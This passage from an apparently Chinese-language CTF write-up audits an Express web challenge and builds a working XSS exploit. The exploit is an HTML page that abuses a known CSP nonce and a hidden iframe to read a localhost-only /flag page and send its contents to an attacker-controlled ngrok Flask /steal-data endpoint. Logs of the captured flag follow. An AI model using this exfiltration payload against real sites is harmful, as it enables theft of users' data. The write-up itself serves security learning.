chunk;</span><br><span class="line">            &#125;);</span><br><span class="line">            resp.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">resolve</span>(&#123;resp, data&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(err);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么，这段代码就是尝试访问&#x2F;js路由，然后收集后端传的data，并且生成一个uuid，然后做一个键值对的映射并储存。<br>如果通过这个的话，就算域名注册成功了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    (&#123;_, data&#125; = <span class="keyword">await</span> <span class="title function_">sendRequest</span>(url + <span class="string">&quot;js&quot;</span>, &#123;<span class="string">&#x27;headers&#x27;</span>: &#123;&#125;&#125;));</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`<span class="subst">$&#123;url&#125;</span> js api error`</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> jsCode = data; <span class="comment">// 获取data，这个命名已经明示要写一个JS的代码了</span></span><br><span class="line"><span class="keyword">const</span> uuid = <span class="title function_">uuidv4</span>(); <span class="comment">// 生成一个uuid</span></span><br><span class="line">apis.<span class="title function_">set</span>(uuid, jsCode); <span class="comment">// 做一个键值对的映射并储存</span></span><br><span class="line">res.<span class="title function_">send</span>(<span class="string">&quot;congrats! your uuid is: &quot;</span> + uuid); <span class="comment">// 如果成功，会获得这个uuid。</span></span><br></pre></td></tr></table></figure>

<h4 id="编写代码：通过API测试"><a href="#编写代码：通过API测试" class="headerlink" title="编写代码：通过API测试"></a>编写代码：通过API测试</h4><p>通过这个很简单，可以本地写一个flask后端，然后用ngrok来弄到公网上。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, redirect, url_for, request, make_response, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello, World!&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="comment"># 随机长度大小</span></span><br><span class="line">    rand_int = <span class="built_in">len</span>(name)</span><br><span class="line">    data = &#123;<span class="string">&#x27;len&#x27;</span>:rand_int,<span class="string">&#x27;code&#x27;</span>:<span class="number">200</span>&#125;</span><br><span class="line">    response = make_response(data)</span><br><span class="line"></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    response.status_code = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/redirect&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect_url</span>():</span><br><span class="line">    ref = request.referrer</span><br><span class="line">    refhost = urllib.parse.urlparse(ref).netloc</span><br><span class="line">    host = request.host</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(host) != <span class="built_in">str</span>(refhost):</span><br><span class="line">        response = make_response(<span class="string">&#x27;this is forbidden&#x27;</span>)</span><br><span class="line">        response.status_code = <span class="number">404</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">if</span> refhost <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: No URL provided.&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> redirect(ref+<span class="string">&quot;success&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/success&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Success!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/steal-data&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">steal</span>():</span><br><span class="line">    data = request.args.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;data&#x27;</span>:data&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/js&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">js_route</span>():</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask run</span><br><span class="line">ngrok http 5000</span><br></pre></td></tr></table></figure>

<p>将ngrok所给的域名输入到domain的框框里，然后点击register，进行测试，测试通过就会返回uuid，正如上面分析的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">congrats! your uuid is: 9863f250-402f-4172-87bf-ba6fe4326cde</span><br></pre></td></tr></table></figure>

<h4 id="审计代码：如何进行XSS攻击"><a href="#审计代码：如何进行XSS攻击" class="headerlink" title="审计代码：如何进行XSS攻击"></a>审计代码：如何进行XSS攻击</h4><p>接下来，是要尝试进行XSS攻击。分析剩下的代码。</p>
<p>看flag的路由，</p>
<blockquote>
<p>它是一个node的Express框架的路由处理器，处理HTTP GET请求。<br>req 对象包含了请求的信息，其中 req.socket.remoteAddress 获取了请求方的 IP 地址。<br>通过 ip.includes(‘127.0.0.1’) 检查 IP 地址是否包含 ‘127.0.0.1’，即是否为本地 IP 地址。<br>如果 IP 地址不是本地 IP，将该 IP 地址记录到控制台，并发送 “No Way” 响应给请求方。<br>如果 IP 地址是本地 IP，将 “Bot got the flag!” 记录到控制台，并发送带有 FLAG 的响应给请求方。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* let the bot visit.  */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> ip = req.<span class="property">socket</span>.<span class="property">remoteAddress</span>; <span class="comment">//获取请求方的 IP 地址。</span></span><br><span class="line">    <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123; <span class="comment">// 检查 IP 地址是否包含 &#x27;127.0.0.1&#x27;</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(ip)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;No Way&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Bot got the flag!&quot;</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;your highness, h3r3 is the flag: &quot;</span> + <span class="variable constant_">FLAG</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显不能直接访问，再看看剩下几个路由。</p>
<p>当有 HTTP GET 请求到达 ‘&#x2F;js&#x2F;:uuid’ 路径时，Express 框架将触发这个路由处理器。通过 req.params.hasOwnProperty(‘uuid’) 检查请求参数中是否包含 ‘uuid’。:uuid 是路由的参数，它允许在URL中包含一个动态的值。如果请求参数中包含 ‘uuid’，则提取 ‘uuid’ 参数的值。之后检查 ‘uuid’ 是否存在于名为 ‘apis’ 的集合中。如果 ‘uuid’ 存在于 ‘apis’ 集合中，通过 res.setHeader 设置 Content-Security-Policy 头部，限制只能执行包含指定 nonce（在这里是 ‘XssFun’）的脚本，然后将 ‘uuid’ 对应的内容作为响应发送给请求方。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* put the js on local side for the CORS reason */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/js/:uuid&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">params</span>.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;uuid&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">const</span> uuid = req.<span class="property">params</span>.<span class="property">uuid</span>; <span class="comment">// 检查是否带了uuid参数</span></span><br><span class="line">        <span class="keyword">if</span> (apis.<span class="title function_">has</span>(uuid)) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-Security-Policy&quot;</span>, <span class="string">&quot;script-src &#x27;nonce-XssFun&#x27;&quot;</span>); <span class="comment">// 设置了CSP，只允许nonce=XssFun。</span></span><br><span class="line">            res.<span class="title function_">send</span>(apis.<span class="title function_">get</span>(uuid));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;Not Found&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Missing uuid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>当有 HTTP GET 请求到达 ‘&#x2F;report’ 路径时，Express 框架将触发这个路由处理器。首先 req.query.hasOwnProperty(‘uuid’) 检查请求参数中是否包含 ‘uuid’。</p>
<p><strong>req.query.hasOwnProperty(‘uuid’)这一段是可以直接在访问后加get参数?uuid&#x3D;xxxx传值的</strong></p>
<p>如果请求参数中包含 ‘uuid’，则提取 ‘uuid’ 参数的值。之后检查 ‘uuid’ 是否存在于名为 ‘apis’ 的集合中，如果 ‘uuid’ 存在于 ‘apis’ 集合中，调用名为 ‘visit’ 的函数，传递包含 ‘uuid’ 的指定URL。</p>
<p>如果visit执行结束，会在该页面返回“Finished”。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;uuid&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">const</span> uuid = req.<span class="property">query</span>.<span class="property">uuid</span>;</span><br><span class="line">        <span class="keyword">if</span> (apis.<span class="title function_">has</span>(uuid)) &#123;</span><br><span class="line">            <span class="title function_">visit</span>(<span class="string">&#x27;http://127.0.0.1:8080/js/&#x27;</span> + uuid).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&quot;Finished&quot;</span>);</span><br><span class="line">            &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&quot;puppeteer error&quot;</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;uuid not registered yet&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Missing uuid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>再分析visit函数。是用了puppeteer弄了个无头浏览器，然后开了一个标签页访问页面，页面的url就是上面的&#x2F;report传过来的参数，其为’<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/js/">http://127.0.0.1:8080/js/</a>‘ + uuid。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">visit</span> = <span class="keyword">async</span> url =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;<span class="attr">headless</span>: <span class="literal">true</span>,<span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]&#125;)</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="comment">// 绕过ngrok浏览器警告</span></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setExtraHTTPHeaders</span>(&#123;</span><br><span class="line">        <span class="string">&quot;ngrok-skip-browser-warning&quot;</span>: <span class="string">&quot;69420&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url); <span class="comment">// 去这个网址  http://127.0.0.1:8080/js/uuid</span></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="最终分析"><a href="#最终分析" class="headerlink" title="最终分析"></a>最终分析</h4><p>那么，直接访问&#x2F;js触发xss访问&#x2F;flag可能会很困难，因为访问&#x2F;flag需要请求主机的地址是127.0.0.1。但是&#x2F;report会给visit函数传递一个含有127.0.0.1的URL参数，那就可以通过visit函数来触发xss了。</p>
<p>但是又有一个问题：没有回显。因为调用visit函数是在&#x2F;report下，直接回显是比较困难的了。</p>
<p>结合之前的分析，可以得出，我们可以通过服务器访问&#x2F;js时获取的data向服务器写入含XSS漏洞的页面，然后访问&#x2F;report，调用visit函数使服务器本地访问该页面。再结合之前的后端编写，就可以得出这样一个思路：让含XSS漏洞页面完成让访问该页面的用户访问&#x2F;flag页面，并且把结果发到我们的另一个页面，也即我们flask后端的一个路由上。</p>
<h4 id="XSS漏洞页面编写"><a href="#XSS漏洞页面编写" class="headerlink" title="XSS漏洞页面编写"></a>XSS漏洞页面编写</h4><p>之前的思路为，让XSS漏洞页面完成两个任务：</p>
<ol>
<li>访问&#x2F;flag页面获取内容；</li>
<li>把内容发送到flask后端。</li>
</ol>
<p>用get传参肯定是最简单的，方便看，也方便打印。让其发到flask后端的一个&#x2F;steal-data路径上。编写网页完成任务：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>XSS Attack<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&#x27;XssFun&#x27;</span>&gt;</span></span><br><span class="line">        // 攻击代码</span><br><span class="line">        &#123;#alert(0);#&#125;</span><br><span class="line">        const targetPageUrl = &#x27;/flag&#x27;;  // 目标页面的URL</span><br><span class="line">        const maliciousHost = &#x27;https://ngrok_domain&#x27;;  // 恶意主机的URL</span><br><span class="line"></span><br><span class="line">        // 创建一个隐藏的iframe</span><br><span class="line">        const iframe = document.createElement(&#x27;iframe&#x27;);</span><br><span class="line">        iframe.style.display = &#x27;none&#x27;;</span><br><span class="line">        document.body.appendChild(iframe);</span><br><span class="line"></span><br><span class="line">        // 加载目标页面到iframe中</span><br><span class="line">        iframe.src = targetPageUrl;</span><br><span class="line"></span><br><span class="line">        // 等待iframe加载完成</span><br><span class="line">        iframe.onload = function() &#123;</span><br><span class="line">            // 从iframe中读取目标页面的内容</span><br><span class="line">            const targetPageContent = iframe.contentDocument.documentElement.outerHTML;</span><br><span class="line"></span><br><span class="line">            // 构建URL，将目标页面的内容作为查询参数传递</span><br><span class="line">            const url = `$&#123;maliciousHost&#125;/steal-data?data=$&#123;encodeURIComponent(targetPageContent)&#125;`;</span><br><span class="line"></span><br><span class="line">            // 通过设置window.location.href实现GET请求</span><br><span class="line">            window.location.href = url;</span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="flask后端编写"><a href="#flask后端编写" class="headerlink" title="flask后端编写"></a>flask后端编写</h4><p>上面发到&#x2F;steal-data的路径，那么flask的后端就需要写个处理这个get请求的路由。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/steal-data&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">steal</span>():</span><br><span class="line">    data = request.args.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;data&#x27;</span>:data&#125;)</span><br></pre></td></tr></table></figure>

<p>修改&#x2F;js路由，让恶意页面可以通过data传过去保存。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/js&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">js_route</span>():</span><br><span class="line">    html_code=\</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>mal html ...</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_code)</span><br></pre></td></tr></table></figure>

<h4 id="发动攻击"><a href="#发动攻击" class="headerlink" title="发动攻击"></a>发动攻击</h4><p>首先重启flask，保存更改。</p>
<p>然后获取uuid，与此同时XSS页面被传入服务器。</p>
<p>然后&#x2F;report?uuid&#x3D;xxxx让机器人访问XSS页面。</p>
<p>然后就可以在后端的flask看到&#x2F;flag页面被当作get请求的参数传过来了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WARNING: This is a development server. Do not use it <span class="keyword">in</span> a production deployment. Use a production WSGI server instead.</span><br><span class="line"> * Running on http://127.0.0.1:5000</span><br><span class="line">Press CTRL+C to quit</span><br><span class="line">127.0.0.1 - - [03/Dec/2023 22:00:28] <span class="string">&quot;GET /redirect HTTP/1.1&quot;</span> 302 -</span><br><span class="line">127.0.0.1 - - [03/Dec/2023 22:00:30] <span class="string">&quot;GET /redirect HTTP/1.1&quot;</span> 404 -</span><br><span class="line">127.0.0.1 - - [03/Dec/2023 22:00:30] <span class="string">&quot;GET /redirect HTTP/1.1&quot;</span> 404 -</span><br><span class="line">127.0.0.1 - - [03/Dec/2023 22:00:31] <span class="string">&quot;GET /redirect HTTP/1.1&quot;</span> 404 -</span><br><span class="line">127.0.0.1 - - [03/Dec/2023 22:00:32] <span class="string">&quot;GET /js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;&lt;/head&gt;&lt;body&gt;No Way&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">127.0.0.1 - - [03/Dec/2023 22:00:43] <span class="string">&quot;GET /steal-data?data=&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;No%20Way&lt;/body&gt;&lt;/html&gt; HTTP/1.1&quot;</span> 200 -</span><br><span class="line">127.0.0.1 - - [03/Dec/2023 22:01:31] <span class="string">&quot;GET /steal-data?data=&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;your%20highness,%20h3r3%20is%20the%20flag:%20SCUCTF&#123;D3v_i3_1mp0rt4nt_in_s3curity&#125;&lt;/body&gt;&lt;/html&gt; HTTP/1.1&quot;</span> 200 -</span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;&lt;/head&gt;&lt;body&gt;your highness, h3r3 is the flag: SCUCTF&#123;D3v_i3_1mp0rt4nt_in_s3curity&#125;&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">127.0.0.1 - - [03/Dec/2023 22:03:04] <span class="string">&quot;GET /steal-data?data=&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;your%20highness,%20h3r3%20is%20the%20flag:%20SCUCTF&#123;D3v_i3_1mp0rt4nt_in_s3curity&#125;&lt;/body&gt;&lt;/html&gt; HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<h4 id="所有后端的flask代码"><a href="#所有后端的flask代码" class="headerlink" title="所有后端的flask代码"></a>所有后端的flask代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, redirect, url_for, request, make_response, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello, World!&#x27;</span>&#125;), 